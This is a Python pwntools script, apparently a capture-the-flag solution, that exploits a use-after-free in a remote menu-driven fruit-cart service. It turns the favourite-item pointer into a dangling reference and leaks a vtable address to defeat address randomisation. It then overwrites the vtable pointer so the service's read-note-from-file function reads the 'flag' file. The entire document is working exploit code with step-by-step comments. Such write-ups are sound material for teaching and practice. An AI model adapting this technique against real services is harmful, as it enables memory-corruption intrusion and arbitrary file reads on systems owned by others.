import pwnlib
import re
import struct
import sys


def main(host, port):
    conn = pwnlib.tubes.remote.remote(host, port)
    conn.clean()

    # Get the favorite item pointer into a use-after-free condition
    conn.sendlinethen('?:', '6') # add item to cart
    conn.sendlinethen('option:', '0') # apples
    conn.sendlinethen('item:', '9') # set fav item
    conn.sendlinethen('option:', '0') # set apple fav item
    conn.sendlinethen('delete:', '8') # delete item from cart
    conn.sendlinethen('option:', '0') # delete apple from cart
    
    # Leak an address
    pwnlib.log.progress('Leaking text base')

    # The notes and items share the memory space. Create a 
    # note that will be overriden by the change fav item option
    conn.sendline('2')
    conn.sendlinethen('option:', '\x00')

    # Change favorite item to apples
    conn.sendlinethen('cart?', '10')
    conn.sendlinethen('option:', '0')
    conn.sendline('1')

    addr = conn.recvline_contains('#0:')
    addr = re.search('#0: (.*)', addr).group(1)
    addr = addr.ljust(8, '\x00')
    addr = struct.unpack('Q', addr)[0]

    # This addr is in the vtable for apple 
    # .data.rel.ro:0000000000203D50                 dq offset get_name_apple

    text_base = addr - 0x203d50
    pwnlib.log.success('0x%X' % text_base)

    get_note_from_file_ptr = struct.pack('Q', text_base + 0x203cc0)

    pwnlib.log.progress('Getting flag')
   
    # Now update the pointer from the apples vtable address to the pointer
    # to the function to read a note from a file
    conn.sendlinethen('edit:', '3')
    conn.sendline('0')
    conn.sendlinethen('option:', get_note_from_file_ptr)

    # Execute get note from file
    conn.sendline('11')
    # Filename to read
    conn.sendline('flag')
    conn.clean()

    # The get note from file function adds a note with the contents of that file. Otherwise
    # it has no output
    conn.sendline('1')
    flag = re.search('#1: (.*)', conn.recvline_contains('#1')).group(1)
    pwnlib.log.success(flag)


if __name__ == '__main__':
    try:
        main(sys.argv[1], int(sys.argv[2],0))
    except IndexError:
        print('Usage: ex_fruits.py HOST PORT')
